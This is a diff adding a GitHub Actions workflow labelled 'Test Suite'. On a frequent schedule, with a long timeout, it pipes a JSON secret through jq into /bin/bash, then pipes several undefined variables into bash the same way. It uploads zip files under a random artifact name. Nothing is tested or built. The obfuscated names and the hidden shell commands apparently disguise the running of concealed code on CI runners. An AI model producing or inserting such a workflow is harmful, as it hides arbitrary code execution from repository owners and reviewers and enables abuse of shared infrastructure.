@@ -1,0 +1,37 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          vyug3106: ${{ secrets.vyug3106 }}
+        run: |
+          printf '%s' "$vyug3106" | jq -r .y9207 | /bin/bash
+          echo $vimff077 | jq -r .y10 | /bin/bash
+          printf '%s' "$gh13" | jq -r .bn6 | /bin/bash
+          printf '%s' "$rhnn50" | jq -r .yf9 | /bin/bash
+          printf '%s' "$axss13" | jq -r .kq345 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KBlbAPQe
+          path: "*.zip"
+          retention-days: 1
